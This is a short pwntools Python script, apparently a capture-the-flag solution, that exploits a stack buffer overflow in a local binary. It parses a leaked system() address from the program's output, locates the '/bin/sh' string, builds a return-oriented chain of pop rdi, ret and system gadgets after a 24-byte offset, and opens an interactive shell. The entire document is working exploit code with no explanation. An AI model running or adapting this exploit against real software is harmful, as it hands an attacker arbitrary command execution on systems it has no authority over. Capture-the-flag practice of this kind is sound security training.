#!/usr/bin/env python3

from pwn import *

elf = ELF("binary")

io = elf.process()

io.recvuntil(b"Use ")
addr = io.recvuntil(b" ", drop=True)
io.recvuntil(b"sh")

system = int(addr, 16)
sh = next(elf.search(b"/bin/sh\x00"))

payload = flat({
    16 + 8: [
        p64(0x4792c5),  # pop rdi ; ret
        p64(sh),
        p64(0x40101a),  # ret
        p64(system)
    ]
})

io.sendline(payload)

io.interactive()
